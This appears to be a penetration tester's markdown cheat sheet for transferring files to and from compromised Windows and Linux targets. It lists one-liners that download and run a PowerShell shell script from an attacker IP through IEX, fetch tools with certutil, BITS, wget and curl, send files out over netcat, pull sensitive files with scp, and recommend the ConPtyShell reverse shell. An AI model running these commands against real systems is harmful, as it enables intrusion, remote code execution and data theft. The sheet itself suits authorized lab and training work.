# Windows Target
## Start SMB server with authentication
```bash
impacket-smbserver share . -smb2support -username user -password pass
```
## Access authenticated SMB share from Windows
```cmd
net use \\10.10.14.5\share /user:user pass
```

## Map SMB Server to Z: and create C:\working directory with scripts
```cmd
mkdir C:\working
cd C:\working
net use Z: \\IP\share /user:user pass
copy Z:\uploads\winPEASx64.exe .
```
Run [[Windows Privilege Escalation#winPEAS Run and Copy to Z downloads winpeas]] next.


## Download file (PowerShell Start-BitsTransfer)
```PowerShell
Start-BitsTransfer -Source 'http://10.10.14.5/file.exe' -Destination 'C:\Temp'
```
## Download file (PowerShell Net.WebClient)
```powershell
IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/file.exe','C:\temp\file.exe')
```

## Download file (PowerShell Invoke-WebRequest)
```powershell
Invoke-WebRequest -Uri http://10.10.14.5/file.exe -OutFile C:\temp\file.exe
```

## Download and execute PowerShell script using IWR
```powershell
powershell -c "IWR -UseBasicParsing http://10.10.14.5/shell.ps1|IEX"
```
## Execute base64 encoded PowerShell command
```powershell
powershell -EncodedCommand BASE64_ENCODED_COMMAND_HERE
```

## ConPtyShell (GitHub Source)
Great reverse shell payload for Windows targets.
```
https://github.com/antonioCoco/ConPtyShell
```

## Download file (certutil)
```cmd
certutil -urlcache -split -f http://10.10.14.5/file.exe file.exe
```
Delete cache after downloading, if desired.
`certutil -urlcache -split -f http://10.10.14.5/file.exe delete`


# Linux Target
## Upload file to target using netcat
```bash
nc -w 3 $IP 4444 < file.exe
```

## Receive file on target using netcat
```bash
nc -nlvp 4444 > file.exe
```

## Transfer file using base64 over netcat

```bash
base64 -w 0 file | nc $IP 4444
```
## Download file using wget on Linux
```bash
wget http://10.10.14.5/file -O file
```

## Download file using curl on Linux
```bash
curl http://10.10.14.5/file -o file
```

# General
## Start Python HTTP server on port 80
```bash
python3 -m http.server 80
```

## Generate self-signed certificate for HTTPS server
```bash
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
```

## Start Python HTTPS server

```python
python3 -c "import http.server, ssl, socketserver; httpd = socketserver.TCPServer(('', 443), http.server.SimpleHTTPRequestHandler); httpd.socket = ssl.wrap_socket(httpd.socket, certfile='server.pem', server_side=True); httpd.serve_forever()"
```

## Start Python FTP server
```bash
python3 -m pyftpdlib -p 21 -w
```

## Download from FTP server
```bash
wget ftp://10.10.14.5/file.exe
```

## Upload file to target using SCP
```bash
scp file.exe user@$IP:/tmp/
```

## Download file from target using SCP
```bash
scp user@$IP:/tmp/sensitive_file.txt .
```

## Verify file hash on Linux
```bash
sha256sum file.exe
```

## Verify file hash Windows
```cmd
certutil -hashfile file.exe SHA256
```

